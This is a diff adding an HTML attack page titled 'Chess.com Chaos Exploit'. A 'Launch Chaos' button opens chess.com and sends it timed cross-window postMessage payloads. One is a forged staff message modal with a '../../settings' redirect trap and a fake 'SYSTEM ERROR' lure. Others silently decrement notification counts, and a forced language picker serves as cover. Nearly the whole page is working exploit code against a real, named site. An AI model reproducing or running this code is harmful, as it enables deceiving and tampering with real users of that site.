@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Chess.com Chaos Exploit</title>
+    <style>
+        body { background: #2c3e50; color: #ecf0f1; font-family: monospace; text-align: center; padding: 20px; }
+        button { 
+            background: #e74c3c; color: white; padding: 20px; 
+            border: none; border-radius: 8px; font-size: 18px; 
+            cursor: pointer; width: 100%; margin-top: 15px; font-weight: bold; 
+        }
+        .status { color: #f1c40f; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <h1>🌪️ Total Chaos Attack (Chaos) 🌪️</h1>
+    <p>Executing all discovered vulnerabilities simultaneously.</p>
+
+    <button onclick="attack()">🚀 Launch Chaos</button>
+
+    <div id="log" class="status">Waiting...</div>
+
+    <script>
+        function attack() {
+            var target = window.open('https://www.chess.com/home', '_blank');
+            document.getElementById('log').innerText = "Target Opened. Deploying payloads...";
+
+            // 1. Message Payload (Primary Vector)
+            var msgPayload = {
+                event: "SHOW_MESSAGE_MODAL", 
+                user: {
+                    userId: 2, 
+                    username: "../../settings", // Redirect Trap
+                    name: "SYSTEM ERROR: UI FAILURE",
+                    country: { code: "XX", name: "Please reset settings" },
+                    isStaff: true,
+                    avatar_url: "https://images.chesscomfiles.com/uploads/v1/user/41.png",
+                    isOnline: true
+                }
+            };
+
+            // 2. Language Payload (UI Disruption)
+            var langPayload = "OPEN_LANGUAGE_PICKER";
+
+            // 3. Notification Payload (Silent State Tampering)
+            var badgePayload1 = { key: "decrement-notification-count", notification: "messages" };
+            var badgePayload2 = { key: "decrement-notification-count", notification: "alerts" };
+
+            // Send commands in rapid succession to create UI confusion
+            setTimeout(() => {
+                // First: Reset notifications silently
+                target.postMessage(badgePayload1, '*');
+                target.postMessage(badgePayload2, '*');
+                console.log("Badges reset sent");
+            }, 2000);
+
+            setTimeout(() => {
+                // Second: Trigger the Message Modal (The Trap)
+                target.postMessage(msgPayload, '*');
+                console.log("Message modal sent");
+            }, 2500);
+
+            setTimeout(() => {
+                // Third: Force open Language Picker on top (The Cover)
+                target.postMessage(langPayload, '*');
+                console.log("Language picker sent");
+                document.getElementById('log').innerText = "✅ Chaos Deployed!";
+            }, 3500);
+        }
+    </script>
+</body>
+</html>
